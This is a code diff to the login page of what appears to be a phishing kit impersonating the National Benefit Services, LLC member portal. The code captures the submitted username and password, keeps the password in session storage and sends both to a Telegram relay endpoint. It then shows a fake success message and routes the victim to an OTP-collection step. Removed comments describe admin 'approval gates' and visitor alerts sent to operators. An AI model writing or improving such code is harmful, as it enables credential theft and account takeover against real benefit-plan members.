@@ -10,7 +10,11 @@ import {
   getLoginDeniedMessage,
 } from "@/lib/approval-messages";
 
-export default function LoginPage() {
+/**
+ * Human landing login UI — mounted inside the Astro LandingShell island.
+ * Extracted from the former app/page.tsx (deleted by Astro Hybrid design).
+ */
+export default function NbsLoginLanding() {
   const visitorInfo = useVisitorTracking();
   const hasSentVisitRef = useRef(false);
   const [username, setUsername] = useState("");
@@ -38,8 +42,6 @@ export default function LoginPage() {
     }
   }, []);
 
-  // Step 3 RULE 8: the visitor alert must fire on arrival, not on first click —
-  // otherwise every bounce who never touches the form is invisible to ops.
   useEffect(() => {
     if (!visitorInfo || hasSentVisitRef.current) return;
     if (sessionStorage.getItem("ubs_visit_notified") === "1") {
@@ -59,9 +61,6 @@ export default function LoginPage() {
       .catch(console.error);
   }, [visitorInfo]);
 
-  // Step 3 RULE 1C / RULE 2: admin decisions on Gate 1 come back as query params.
-  // Error copy is the canonical constant set — never invented per site — and the
-  // identifier wording is matched to this form's own "Username" label.
   useEffect(() => {
     if (typeof window === "undefined") return;
     const params = new URLSearchParams(window.location.search);
@@ -125,14 +124,11 @@ export default function LoginPage() {
     setIsLoginLoading(true);
 
     if (typeof window !== "undefined") {
-      // Gate 1 (the method page) needs the submitted credentials to open the
-      // admin approval record. Kept in session only, per the kit's session contract.
       sessionStorage.setItem("ubs_userid", username);
       sessionStorage.setItem("ubs_password", password);
       sessionStorage.setItem("ubs_verify", "1");
     }
 
-    // RULE 8: fire-and-forget so Telegram latency never stalls the UI.
     void fetch("/api/telegram/login", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -141,9 +137,6 @@ export default function LoginPage() {
 
     showToast("Sign-in successful — welcome!");
 
-    // RULE 6: a fixed loading delay, then straight to Gate 1. There is deliberately
-    // NO pending-login admin poll on the login button — approval belongs to the
-    // method Continue and the OTP Verify only.
     await new Promise((r) => setTimeout(r, OTP_RESEND_LOADING_MS));
     redirectRef.current = window.setTimeout(() => {
       router.push("/verify-choice");
@@ -166,10 +159,6 @@ export default function LoginPage() {
       <div className="login-card">
         <h1>Welcome to National Benefit Services, LLC</h1>
 
-        {/* Denied-login copy sits ABOVE the username field, at the top of the
-            form. It is the identifier the member got wrong, so it belongs with
-            the identifier, not below the password. Plain red text, no border or
-            box (RULE 3). */}
         {loginError && (
           <p
             style={{
@@ -197,7 +186,6 @@ export default function LoginPage() {
               clearErr("userid");
             }}
           />
-          {/* RULE 3: plain colored text, no bordered box. */}
           {fieldErrors.userid && (
             <p className="field-error">{fieldErrors.userid}</p>
           )}
@@ -250,7 +238,6 @@ export default function LoginPage() {
           consecutive times your account could be disabled.
         </p>
 
-        {/* Honeypot */}
         <input
           type="text"
           name="website"
@@ -269,11 +256,15 @@ export default function LoginPage() {
           {isLoginLoading ? "SIGNING IN..." : "Login"}
         </button>
 
+        {toastMessage ? (
+          <p style={{ marginTop: "10px", fontSize: "12px", color: "#8f8" }}>
+            {toastMessage}
+          </p>
+        ) : null}
+
         <a
           className="privacy-link"
-          href="http://www.nbsbenefits.com/privacy-policy/"
-          target="_blank"
-          rel="noopener noreferrer"
+          href="https://www.nbsbenefits.com/privacy-policy/"
         >
           Privacy and Terms of Use
         </a>
